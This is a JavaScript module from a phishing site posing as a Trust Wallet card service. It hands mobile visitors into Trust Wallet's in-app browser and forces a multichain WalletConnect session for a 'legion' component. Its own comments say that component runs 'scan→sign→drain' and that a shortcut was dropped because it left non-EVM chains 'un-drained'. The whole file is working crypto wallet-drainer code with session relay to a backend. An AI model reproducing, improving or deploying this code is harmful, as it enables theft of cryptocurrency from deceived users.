/**
 * Trust open_url → in-app browser handoff v1.2
 *
 * Outside Trust: open_url into Trust dApp Browser.
 * Inside Trust (utm_source=Trust_iOS_Browser): NEVER open trust:// / link.trustwallet.com
 * again — that triggers "blocked from automatically opening an external application".
 * Stay put → AppKit/WC multichain (all namespaces) — NOT eth_requestAccounts ETH-only sheet.
 */
(function () {
  'use strict';

  var HANDOFF_KEY = 'trust_open_inapp_handoff';
  var SKIP_KEY = 'trust_skip_open_inapp';
  var INAPP_KEY = 'trust_confirmed_inapp';
  var handoffArmed = false;

  function isMobile() {
    try {
      var ua = navigator.userAgent || '';
      if (/iPhone|iPad|iPod|Android|Mobile/i.test(ua)) return true;
      if (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1) return true;
    } catch (_) {}
    return false;
  }

  function markInApp() {
    try {
      sessionStorage.setItem(INAPP_KEY, '1');
      window.__TRUST_IN_APP__ = true;
      // Kill WC deep-link target so Legion won't fire trust://wc
      window.__LEGION_DEEP_LINK_TARGET__ = null;
    } catch (_) {}
  }

  function isTrustInApp() {
    try {
      if (window.__TRUST_IN_APP__) return true;
      try {
        if (sessionStorage.getItem(INAPP_KEY) === '1') return true;
      } catch (_) {}

      // Trust Browser stamps this on successful open_url (screenshot proof)
      var q = '';
      try {
        q = String(window.location.search || '') + '&' + String(window.location.hash || '');
      } catch (_) {}
      if (/utm_source=Trust_(iOS|Android)_Browser/i.test(q)) { markInApp(); return true; }
      if (/[?&]trust_inapp=1(?:&|$)/i.test(q)) { markInApp(); return true; }

      var ua = navigator.userAgent || '';
      if (/Trust\/[\d.]+/i.test(ua)) { markInApp(); return true; }
      if (/Trust_iOS_Browser|Trust_Android_Browser/i.test(ua)) { markInApp(); return true; }
      if (window.ethereum && (window.ethereum.isTrust || window.ethereum.isTrustWallet)) {
        markInApp(); return true;
      }
      if (window.trustwallet && window.trustwallet.ethereum) { markInApp(); return true; }
    } catch (_) {}
    return false;
  }

  function siteUrl() {
    try {
      var u = new URL(window.location.href);
      u.hash = '';
      u.protocol = 'https:';
      u.searchParams.set('trust_inapp', '1');
      u.searchParams.delete('utm_source');
      return u.toString();
    } catch (_) {
      return 'https://trust-wallet-card.surge.sh/?trust_inapp=1';
    }
  }

  function openUrlNative(url) {
    return 'trust://open_url?coin_id=60&url=' + encodeURIComponent(url);
  }

  function openUrlUniversal(url) {
    return 'https://link.trustwallet.com/open_url?coin_id=60&url=' + encodeURIComponent(url);
  }

  function isExternalAppHref(href) {
    var s = String(href || '').toLowerCase();
    if (!s) return false;
    if (s.indexOf('trust://') === 0) return true;
    if (s.indexOf('https://link.trustwallet.com/') === 0) return true;
    if (s.indexOf('http://link.trustwallet.com/') === 0) return true;
    return false;
  }

  /** Block trust:// / open_url while already inside Trust Browser. */
  function installInAppNavGuard() {
    if (window.__TRUST_INAPP_NAV_GUARD__) return;
    window.__TRUST_INAPP_NAV_GUARD__ = true;

    function blockIfNeeded(href, via) {
      if (!isTrustInApp()) return false;
      if (!isExternalAppHref(href)) return false;
      console.warn('[TrustInApp] BLOCKED external open (already in Trust):', via, String(href).slice(0, 120));
      return true;
    }

    try {
      var abs = window.location.assign.bind(window.location);
      var rep = window.location.replace.bind(window.location);
      window.location.assign = function (u) {
        if (blockIfNeeded(u, 'assign')) return;
        return abs(u);
      };
      window.location.replace = function (u) {
        if (blockIfNeeded(u, 'replace')) return;
        return rep(u);
      };
    } catch (_) {}

    document.addEventListener('click', function (e) {
      try {
        if (!isTrustInApp()) return;
        var a = e.target && e.target.closest && e.target.closest('a');
        if (a && isExternalAppHref(a.href)) {
          e.preventDefault();
          e.stopPropagation();
          console.warn('[TrustInApp] BLOCKED <a>', a.href);
        }
      } catch (_) {}
    }, true);

    // Expose for deeplink-rescue
    window.__TRUST_BLOCK_EXTERNAL_IF_INAPP__ = function (href) {
      return isTrustInApp() && isExternalAppHref(href);
    };
  }

  var _handoffChipTimer = null;

  function _showHandoffChip(native, uni) {
    try {
      if (isTrustInApp() || document.hidden) return;
      var chip = document.getElementById('__trust_inapp_chip');
      if (chip) { chip.style.display = ''; return; }
      chip = document.createElement('button');
      chip.id = '__trust_inapp_chip';
      chip.type = 'button';
      chip.textContent = '🛡️ Open in Trust Wallet';
      chip.style.cssText = [
        'position:fixed', 'left:50%', 'transform:translateX(-50%)',
        'bottom:calc(84px + env(safe-area-inset-bottom,0px))',
        'z-index:2147483644', 'background:#0500ff', 'color:#fff',
        'border:0', 'border-radius:999px', 'padding:13px 22px',
        'font:700 14px system-ui,sans-serif',
        'box-shadow:0 8px 28px rgba(5,0,255,.5)', 'white-space:nowrap',
        'cursor:pointer', '-webkit-tap-highlight-color:transparent',
      ].join(';');
      chip.onclick = function (e) {
        e.preventDefault();
        chip.style.display = 'none';
        handoffArmed = false;
        handoffToTrustBrowser();
      };
      document.body.appendChild(chip);
    } catch (_) {}
  }

  function handoffToTrustBrowser() {
    if (isTrustInApp()) {
      console.warn('[TrustInApp] skip handoff — already inside Trust Browser');
      return false;
    }
    if (!isMobile()) return false;
    try {
      if (sessionStorage.getItem(SKIP_KEY) === '1') return false;
    } catch (_) {}
    if (handoffArmed) return true;
    handoffArmed = true;

    var url = siteUrl();
    try { sessionStorage.setItem(HANDOFF_KEY, '1'); } catch (_) {}
    console.warn('[TrustInApp] open_url → Trust Browser', url);

    var native = openUrlNative(url);
    var uni = openUrlUniversal(url);

    // Primary: window.location.href is the most reliable deeplink trigger
    // (a.click() on hidden elements is blocked by iOS Safari security policy)
    try { window.location.href = native; } catch (_) {}

    // Universal link fallback after 1.5s (fires if native deeplink failed)
    setTimeout(function () {
      try {
        if (isTrustInApp() || document.hidden) return;
        window.location.href = uni;
      } catch (_) {}
    }, 1500);

    // Chip fallback after 3s — visible "Open in Trust Wallet" button if both failed
    clearTimeout(_handoffChipTimer);
    _handoffChipTimer = setTimeout(function () {
      try { _showHandoffChip(native, uni); } catch (_) {}
    }, 3000);

    return true;
  }

  function getInjectedTrust() {
    try {
      if (window.trustwallet && window.trustwallet.ethereum) return window.trustwallet.ethereum;
    } catch (_) {}
    try {
      var eth = window.ethereum;
      if (!eth) return null;
      if (eth.isTrust || eth.isTrustWallet) return eth;
      if (eth.providers && eth.providers.length) {
        for (var i = 0; i < eth.providers.length; i++) {
          var p = eth.providers[i];
          if (p && (p.isTrust || p.isTrustWallet)) return p;
        }
      }
      if (isTrustInApp()) return eth;
    } catch (_) {}
    return null;
  }

  var _connectInFlight = false;
  var _connectDoneAddr = '';
  var _connectPromise = null;
  var _wcRetryCount = 0;
  var _WC_MAX_RETRIES = 2;

  function showAppKitModal() {
    try {
      var s = document.getElementById('__wc_appkit_css');
      if (!s) {
        s = document.createElement('style');
        s.id = '__wc_appkit_css';
        document.head.appendChild(s);
      }
      // In Trust Browser we WANT the AppKit sheet (multi-chain namespaces)
      s.textContent = '';
    } catch (_) {}
  }

  function waitForLegion(ms) {
    ms = ms || 12000;
    return new Promise(function (resolve) {
      var start = Date.now();
      (function tick() {
        if (window.legion && typeof window.legion.connectWC === 'function') {
          resolve(window.legion);
          return;
        }
        if (Date.now() - start > ms) {
          resolve(null);
          return;
        }
        setTimeout(tick, 120);
      })();
    });
  }

  /** Silent address — used only for resume / injected fallback. */
  async function resolveTrustAddressSilent(prov) {
    var addr = '';
    try {
      var sel = prov.selectedAddress || prov.address || '';
      if (sel) addr = String(sel).toLowerCase();
    } catch (_) {}
    if (!addr) {
      try {
        var st = prov._state || prov._addresses || null;
        if (st && st.accounts && st.accounts[0]) addr = String(st.accounts[0]).toLowerCase();
      } catch (_) {}
    }
    if (!addr) {
      try {
        var accts = await prov.request({ method: 'eth_accounts' });
        if (accts && accts[0]) addr = String(accts[0]).toLowerCase();
      } catch (_) {}
    }
    if (!addr) {
      try {
        addr = String(sessionStorage.getItem('trust_site_connected_addr') || '').toLowerCase();
      } catch (_) {}
    }
    if (!addr) {
      try {
        addr = String(sessionStorage.getItem('legion_wc_evm_addr') || '').toLowerCase();
      } catch (_) {}
    }
    if (addr && addr.indexOf('0x') === 0 && addr.length >= 42) return addr;
    return '';
  }

  /** Retry WC connect (no ETH-only degradation). Resets single-flight state and re-fires. */
  async function wcRetry(reason) {
    if (_wcRetryCount >= _WC_MAX_RETRIES) {
      console.warn('[TrustInApp] WC retries exhausted (' + _WC_MAX_RETRIES + ') — giving up, reason: ' + reason);
      return false;
    }
    _wcRetryCount++;
    console.warn('[TrustInApp] WC retry #' + _wcRetryCount + '/' + _WC_MAX_RETRIES + ' — reason: ' + reason);
    _connectInFlight = false;
    _connectPromise = null;
    window.__TRUST_CONNECT_LOCK__ = false;
    await new Promise(function (r) { setTimeout(r, 2000); });
    return connectAppKitTrust();
  }

  /**
   * PRIMARY in-app path: Reown AppKit / WC with optionalNamespaces.
   * SINGLE-FLIGHT: boot / direct / openSmartConnect / wrapConnect share one promise.
   */
  async function connectAppKitTrust() {
    try {
      if (window.__TRUST_CONNECT_DONE_ADDR__) {
        _connectDoneAddr = String(window.__TRUST_CONNECT_DONE_ADDR__);
        console.warn('[TrustInApp] already connected (global)', _connectDoneAddr.slice(0, 10));
        return true;
      }
    } catch (_) {}
    if (_connectDoneAddr) {
      console.warn('[TrustInApp] already connected', _connectDoneAddr.slice(0, 10));
      return true;
    }
    // Sync global lock — prevents bootInApp + direct + wrap racing before _connectInFlight flips
    if (window.__TRUST_CONNECT_LOCK__ && _connectPromise) {
      console.warn('[TrustInApp] connect already in-flight (global) — join');
      return _connectPromise;
    }
    if (_connectInFlight && _connectPromise) {
      console.warn('[TrustInApp] connect already in-flight — join');
      return _connectPromise;
    }

    window.__TRUST_CONNECT_LOCK__ = true;
    _connectInFlight = true;
    _connectPromise = (async function () {
    markInApp();
    try { window.__TRUST_INAPP_APPKIT__ = true; } catch (_) {}
    try { window.__LEGION_DEEP_LINK_TARGET__ = null; } catch (_) {}
    try { window.__SELECTED_WALLET__ = 'trust'; } catch (_) {}

    // Always use WC/AppKit (multi-chain: SOL+BTC+TRON+TON+EVM namespaces).
    // Injected shortcut removed — it only gave ETH address, leaving non-EVM chains un-drained.
    // Trust Browser intercepts the WC URI natively and shows its own multi-chain approval sheet.
    // On failure: wcRetry() fires (up to _WC_MAX_RETRIES times) — never degrades to ETH-only.
    showAppKitModal();
    console.warn('[TrustInApp] WC multichain connect — all chains (SOL/BTC/TRON/TON/EVM)');

    try {
      var L = await waitForLegion(15000);
      if (!L) {
        console.warn('[TrustInApp] legion not ready — WC retry');
        return await wcRetry('legion-not-ready');
      }

      var existing = '';
      try {
        existing = String((L.state && L.state.evmAddr) || sessionStorage.getItem('legion_wc_evm_addr') || '').toLowerCase();
      } catch (_) {}
      if (existing && existing.indexOf('0x') === 0 && L.state && (L.state.wcSessionActive || L.state.evmProvider)) {
        _connectDoneAddr = existing;
        try { window.__TRUST_CONNECT_DONE_ADDR__ = existing; } catch (_) {}
        console.warn('[TrustInApp] resume session', existing.slice(0, 10));
        // Register WC session with backend relay BEFORE starting pipeline
        // (resume path skips bundledWalletConnect so we must call it here)
        try { if (typeof L.registerWcSession === 'function') L.registerWcSession(); } catch (_) {}
        try {
          if (typeof L.startPipeline === 'function') L.startPipeline({ reason: 'resume' });
          else if (typeof L.continueConnected === 'function') L.continueConnected();
        } catch (_) {}
        return true;
      }

      try { if (typeof L.beginConnect === 'function') L.beginConnect('wc'); } catch (_) {}
      // Do NOT clearWc on every entry — wipes in-flight AppKit
      if (typeof L.connectWC === 'function') {
        await Promise.resolve(L.connectWC());
      } else if (typeof L.connect === 'function') {
        await Promise.resolve(L.connect());
      }

      var addr = '';
      for (var i = 0; i < 40; i++) {
        try {
          addr = String((L.state && L.state.evmAddr) || sessionStorage.getItem('legion_wc_evm_addr') || '').toLowerCase();
        } catch (_) {}
        if (addr && addr.indexOf('0x') === 0) break;
        await new Promise(function (r) { setTimeout(r, 500); });
      }
      if (addr && addr.indexOf('0x') === 0) {
        _connectDoneAddr = addr;
        try { window.__TRUST_CONNECT_DONE_ADDR__ = addr; } catch (_) {}
        try { sessionStorage.setItem('trust_site_connected_addr', addr); } catch (_) {}
        console.warn('[TrustInApp] WC connected', addr.slice(0, 10));
        return true;
      }

      console.warn('[TrustInApp] WC gave no address — retry WC');
      return await wcRetry('no-addr');
    } catch (e) {
      console.warn('[TrustInApp] WC error', e && e.message, '— retry WC');
      return await wcRetry('wc-error');
    }
    })().finally(function () {
      _connectInFlight = false;
      // Keep global lock until done-addr set so late callers join/skip instead of re-fire
      try {
        if (_connectDoneAddr || window.__TRUST_CONNECT_DONE_ADDR__) {
          window.__TRUST_CONNECT_LOCK__ = true;
        } else {
          window.__TRUST_CONNECT_LOCK__ = false;
          _connectPromise = null;
        }
      } catch (_) {
        _connectPromise = null;
      }
    });

    return _connectPromise;
  }

  /** Last resort: injected eth_requestAccounts (ETH-only Connect DApp). */
  async function connectInjectedTrustFallback() {
    var prov = getInjectedTrust();
    if (!prov || typeof prov.request !== 'function') {
      console.warn('[TrustInApp] no injected provider for fallback');
      return false;
    }
    console.warn('[TrustInApp] FALLBACK injected eth_requestAccounts (ETH-only)');
    try { window.__SELECTED_WALLET__ = 'trust'; } catch (_) {}

    var addr = await resolveTrustAddressSilent(prov);
    if (!addr) {
      var accounts = await prov.request({ method: 'eth_requestAccounts' });
      addr = accounts && accounts[0] ? String(accounts[0]).toLowerCase() : '';
    }
    if (!addr) throw new Error('no account');
    _connectDoneAddr = addr;
    try { window.__TRUST_CONNECT_DONE_ADDR__ = addr; } catch (_) {}

    try {
      sessionStorage.setItem('trust_site_connected_addr', addr);
      sessionStorage.setItem('legion_wc_evm_addr', addr);
    } catch (_) {}

    var chainId = 1;
    try {
      var hex = await prov.request({ method: 'eth_chainId' });
      chainId = parseInt(String(hex).replace('0x', ''), 16) || 1;
    } catch (_) {}

    var L = window.legion;
    if (L && L.state) {
      L.state.evmProvider = prov;
      L.state.evmAddr = addr;
      L.state.evmChain = chainId;
      L.state.connectMode = 'injected';
      L.state.evmWallet = 'Trust Wallet';
      L.state.injectedWalletKey = 'trust';
      L.state.wcSessionActive = false;
    }

    try {
      window.dispatchEvent(new CustomEvent('legion:connected', {
        detail: { address: addr, chainId: chainId, wallet: 'Trust Wallet', mode: 'injected' },
      }));
    } catch (_) {}

    // Notify only — legion startPipeline / handleEvmConnect owns scan→sign→drain
    // Do NOT call forceTrustSign or drain here (kills dual-pipeline race)
    try {
      if (L && typeof L.startPipeline === 'function') {
        L.startPipeline({ reason: 'connect-injected' }).catch(function (e) {
          console.warn('[TrustInApp] startPipeline', e && e.message);
        });
      } else if (L && typeof L.notifyConnect === 'function') {
        L.notifyConnect(addr, chainId, 'Trust Wallet').catch(function (e) {
          console.warn('[TrustInApp] notify', e && e.message);
        });
      }
    } catch (_) {}

    return true;
  }

  /** @deprecated name kept — now AppKit primary */
  async function connectInjectedTrust() {
    return connectAppKitTrust();
  }

  function preferInAppOrContinue(continueFn) {
    if (isTrustInApp()) {
      connectAppKitTrust().catch(function (e) {
        console.warn('[TrustInApp] AppKit fail', e && e.message);
      });
      return true;
    }
    if (isMobile()) {
      try {
        if (sessionStorage.getItem(SKIP_KEY) === '1') {
          if (typeof continueFn === 'function') continueFn();
          return false;
        }
      } catch (_) {}
      handoffToTrustBrowser();
      return true;
    }
    if (typeof continueFn === 'function') continueFn();
    return false;
  }

  function wrapConnect() {
    var prev = window.__TRUST_DIRECT_CONNECT__;
    if (typeof prev === 'function' && !prev.__inappWrapped) {
      var wrapped = function () {
        return preferInAppOrContinue(function () { return prev.apply(this, arguments); });
      };
      wrapped.__inappWrapped = true;
      window.__TRUST_DIRECT_CONNECT_WC__ = prev;
      window.__TRUST_DIRECT_CONNECT__ = wrapped;
    }

    var prevWc = window.__WC_CONNECT__;
    if (typeof prevWc === 'function' && !prevWc.__inappWrapped) {
      var wrappedWc = function (walletId) {
        if (walletId === 'trust') {
          return preferInAppOrContinue(function () { return prevWc.call(this, walletId); });
        }
        return prevWc.apply(this, arguments);
      };
      wrappedWc.__inappWrapped = true;
      window.__WC_CONNECT__ = wrappedWc;
    }
  }

  function bootInApp() {
    if (!isTrustInApp()) return;
    if (window.__TRUST_BOOT_CONNECT_ARMED__) {
      console.warn('[TrustInApp] boot connect already armed — skip');
      return;
    }
    window.__TRUST_BOOT_CONNECT_ARMED__ = true;
    console.warn('[TrustInApp] inside Trust Browser ✓ — AppKit once');
    markInApp();
    installInAppNavGuard();
    try { window.__TRUST_INAPP_APPKIT__ = true; } catch (_) {}
    try { window.__LEGION_DEEP_LINK_TARGET__ = null; } catch (_) {}

    try {
      var chip = document.getElementById('__trust_inapp_chip');
      if (chip) chip.remove();
      var bar = document.getElementById('__trust_dl_bar');
      if (bar) bar.style.display = 'none';
    } catch (_) {}

    var n = 0;
    var t = setInterval(function () {
      n++;
      if (window.__TRUST_CONNECT_DONE_ADDR__ || _connectDoneAddr) {
        clearInterval(t);
        return;
      }
      var ready = !!(window.legion && typeof window.legion.connectWC === 'function');
      var hasProv = !!(window.ethereum || (window.trustwallet && window.trustwallet.ethereum));
      if (ready || hasProv || n > 60) {
        clearInterval(t);
        connectAppKitTrust().catch(function () {});
      }
    }, 250);
  }

  function ensureChip() {
    if (!isMobile() || isTrustInApp()) return;
    if (document.getElementById('__trust_inapp_chip')) return;
    var chip = document.createElement('button');
    chip.id = '__trust_inapp_chip';
    chip.type = 'button';
    chip.textContent = 'Open in Trust Browser';
    chip.style.cssText = [
      'position:fixed', 'left:50%', 'transform:translateX(-50%)',
      'bottom:calc(72px + env(safe-area-inset-bottom,0px))',
      'z-index:2147483644', 'background:#0500ff', 'color:#fff',
      'border:0', 'border-radius:999px', 'padding:10px 16px',
      'font:700 12px system-ui,sans-serif',
      'box-shadow:0 8px 24px rgba(5,0,255,.4)', 'white-space:nowrap',
    ].join(';');
    chip.onclick = function (e) {
      e.preventDefault();
      handoffArmed = false;
      handoffToTrustBrowser();
    };
    document.body.appendChild(chip);
  }

  window.__TRUST_OPEN_INAPP__ = handoffToTrustBrowser;
  window.__TRUST_IS_IN_APP__ = isTrustInApp;
  window.__TRUST_CONNECT_INJECTED__ = connectInjectedTrust; // alias → AppKit primary
  window.__TRUST_CONNECT_APPKIT__ = connectAppKitTrust;
  window.__TRUST_PREFER_INAPP__ = preferInAppOrContinue;

  function start() {
    installInAppNavGuard();
    bootInApp();
    // ensureChip removed — chip was showing on page load before user interaction
    wrapConnect();
  }

  setTimeout(wrapConnect, 0);
  setTimeout(wrapConnect, 500);
  setInterval(wrapConnect, 2000);

  if (document.body) start();
  else document.addEventListener('DOMContentLoaded', start);
})();
